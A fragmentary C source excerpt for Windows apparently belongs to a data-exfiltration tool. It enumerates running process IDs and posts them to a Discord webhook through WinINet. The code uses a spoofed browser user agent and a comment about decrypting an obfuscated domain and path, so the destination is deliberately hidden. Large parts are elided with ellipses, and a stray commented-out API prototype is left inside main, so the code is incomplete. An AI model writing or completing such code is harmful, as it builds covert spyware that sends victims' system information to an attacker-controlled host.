...
void send_to_discord(const char* message) {
    ...
    // 1. Sanitize the message for JSON (Escaping characters)
    char sanitized[4096] = {0}; // Large enough for escapes
    int j = 0;
    for (int i = 0; message[i] != '\0' && j < sizeof(sanitized) - 2; i++) {
        switch (message[i]) {
            ...
            default:   sanitized[j++] = message[i]; break;
        }
    }

    // 2. Prepare JSON data using the SANITIZED string
    char json_data[5120]; // Ensure this is bigger than sanitized
    snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", sanitized);
    
    const char* headers = "Content-Type: application/json";

    // 3. Network operations (Keep your existing logic)
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        // [Use your decrypted obfuscated_domain and obfuscated_path here]
...
int main(void) {
	...
	BOOL EnumProcesses(
 	 ...
 	 [in]  DWORD   cb,
  	 [out] LPDWORD lpcbNeeded == after the call, this is filled with address
	);*/
	if(EnumProcesses(process, sizeof(process), &needed)) {
		int count = needed/sizeof(DWORD);
		for(int i = 0; i < count; i++) {
			sprintf(temp, "%lu ", process[i]);
			strcat(buffer, temp);
		}
		send_to_discord(buffer);
	}else {
		send_to_discord("failed");
	}
}
